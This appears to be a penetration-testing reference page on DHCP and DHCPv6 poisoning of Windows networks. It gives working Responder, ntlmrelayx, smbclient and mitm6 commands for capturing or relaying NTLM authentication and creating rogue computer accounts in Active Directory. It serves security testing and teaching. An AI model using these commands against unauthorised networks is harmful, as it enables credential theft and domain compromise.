**DHCP poisoning** — when a machine joins a network it broadcasts a DHCP request asking who hands out its settings (DHCP gives each client an IP address, a gateway, and a DNS server). You race the real server and answer first, handing the victim your own IP as its DNS server plus a rogue WPAD entry (WPAD is how Windows auto-discovers a web proxy). Its lookups and proxy logins now flow through you, so you can capture or relay that authentication. This works over IPv4 with Responder and, more reliably on modern Windows, over IPv6 with mitm6.

```
victim -> broadcast: DHCP request (who sets me up?)
attacker -> victim: rogue reply (DNS = you, WPAD)
victim -> attacker: name lookups + proxy logins
attacker: capture or relay the NTLM authentication
```

## IPv4 (Responder)

When a workstation sends a DHCP request for its network settings, you may be able to spoof the answer and inject arbitrary settings (e.g. rogue WPAD/DNS).

```bash

# Spoof DHCP responses + rogue DNS + WPAD
responder --interface 'eth0' --DHCP --DHCP-DNS --wpad
# Relay to a target vulnerable service (3128 = web proxy port)
ntlmrelayx.py -t ldaps://DC_IP --add-computer --http-port 3128

```

The freshly created computer credentials can then be used against other services, e.g. SMB:

```bash

smbclient.py 'DOMAIN/COMPUTER_NAME$:PASSWORD@TARGET_IP'

```

## IPv6 (mitm6)

On Windows, IPv6 is **enabled by default** and has **higher priority** than IPv4, so even on an IPv4 network Windows keeps sending **DHCPv6 requests** to get an IPv6 configuration. An attacker can answer with their own IP as DNS server and redirect part of the clients' traffic - a common front-end for [NTLM Relay to LDAP](NTLM%20Relay%20to%20LDAP.md) and [Kerberos to ESC-8 relay](../mitm6%20relay/Kerberos%20to%20ESC-8%20relay.md).

### Discovery

Capture traffic in Wireshark with the filter `dhcpv6`. If clients on the segment send these requests, they are likely vulnerable.

### Exploitation

1. Configure a link-local IPv6 address on your interface if it has none. From a MAC `11:22:33:44:55:66`, split into `11:22:33` and `44:55:66` and insert `ff:fe`: the link-local address is `fe80::1122:33ff:fe44:5566/64`.

```bash

sudo ip -6 addr add fe80::1122:33ff:fe44:5566/64 dev INTERFACE

```

2. Poison DHCPv6 with `mitm6`.

```bash

# Targeted at a single host
mitm6 --host-whitelist 'TARGET' -d 'DOMAIN' --ignore-nofqdn -i 'INTERFACE'
# Whole local network (noisy)
mitm6 --ignore-nofqdn -i 'INTERFACE'

```

## Caution

**Warning:** mitm6 will cause a Denial of Service on the segment if left running too long. Once you get the first DNS requests (usually seconds), stop it. mitm6 limits impact with a 5-minute DHCP lease TTL and 100-second DNS TTL.

## References

- Responder - https://github.com/lgandx/Responder
- mitm6 - https://github.com/dirkjanm/mitm6
- Fox-IT - mitm6: compromising IPv4 networks via IPv6 - https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
